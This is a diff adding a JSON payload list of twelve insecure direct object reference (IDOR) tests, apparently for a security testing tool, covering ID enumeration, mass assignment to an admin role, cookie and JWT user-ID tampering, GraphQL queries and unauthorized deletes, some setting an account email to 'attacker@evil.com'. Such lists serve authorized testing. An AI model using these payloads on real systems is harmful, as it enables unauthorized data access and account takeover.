@@ -1,0 +1,14 @@
+[
+  {"name":"Sequential ID","category":"IDOR","description":"Increment integer ID","payload":"GET /api/users/1\nGET /api/users/2\nGET /api/users/3","tags":["sequential","basic"]},
+  {"name":"UUID IDOR","category":"IDOR","description":"UUID based object reference","payload":"GET /api/orders/550e8400-e29b-41d4-a716-446655440000","tags":["uuid","basic"]},
+  {"name":"IDOR via Parameter","category":"IDOR","description":"Object ID in URL parameter","payload":"GET /profile?user_id=1337","tags":["parameter","basic"]},
+  {"name":"IDOR in POST Body","category":"IDOR","description":"Object ID in POST body","payload":"POST /api/update\n{\"user_id\": 2, \"email\": \"attacker@evil.com\"}","tags":["post","body"]},
+  {"name":"Horizontal Privilege Escalation","category":"IDOR","description":"Access another user's same-level resource","payload":"GET /api/invoices/1001 (logged in as user owning invoice 1002)","tags":["horizontal","privilege"]},
+  {"name":"Vertical Privilege Escalation","category":"IDOR","description":"Access admin resource as regular user","payload":"GET /api/admin/users/list","tags":["vertical","privilege","admin"]},
+  {"name":"Mass Assignment IDOR","category":"IDOR","description":"Set unauthorized fields via mass assignment","payload":"PUT /api/user/42\n{\"id\":1,\"role\":\"admin\",\"email\":\"attacker@evil.com\"}","tags":["mass-assignment","critical"]},
+  {"name":"Indirect Reference","category":"IDOR","description":"Encoded or hashed reference manipulation","payload":"GET /download?file=aW52b2ljZV8xMDAx (base64 decode and modify)","tags":["indirect","encoded"]},
+  {"name":"GraphQL IDOR","category":"IDOR","description":"IDOR through GraphQL query","payload":"{ order(id: 999) { total items { name } customer { email } } }","tags":["graphql","api"]},
+  {"name":"REST API IDOR","category":"IDOR","description":"REST IDOR across resource types","payload":"DELETE /api/posts/1 (not owner)","tags":["rest","delete"]},
+  {"name":"Cookie IDOR","category":"IDOR","description":"User ID in cookie","payload":"Cookie: user=1337; (modify to 1)","tags":["cookie","session"]},
+  {"name":"JSON Web Token IDOR","category":"IDOR","description":"User ID in JWT payload","payload":"{\"sub\":\"2\",\"role\":\"user\"} → modify sub to 1","tags":["jwt","sub-claim"]}
+]
